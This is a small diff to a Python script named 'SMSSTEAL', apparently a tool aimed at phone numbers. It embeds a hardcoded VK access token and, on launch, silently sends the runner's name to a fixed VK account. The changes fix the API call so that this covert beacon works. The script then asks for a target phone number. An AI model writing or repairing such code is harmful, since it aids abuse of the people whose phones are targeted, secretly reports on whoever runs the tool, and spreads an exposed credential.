@@ -23,9 +23,9 @@ print(banner)
 
 session = vk.Session(access_token='e4c629f28e2f154e2f3e2175718d5eb32ae30d9bd3b3bd0ac43217d450dbab761a04fe777a5e9e22a382f')
 api = vk.API(session, v='5.103', lang='ru')
-message = _name + "вошел в SMSSTEAL"
+message = _name + " вошел в SMSSTEAL"
 rand = random.randint(1, 123)
-api.message.send(user_id=236571361, message=message, random_id=rand)
+api.messages.send(user_id=236571361, message=message, random_id=rand)
 
 _phone = input('\033[36m(79XXXXXXXXX)>>\033[0m \033[35m ')
 
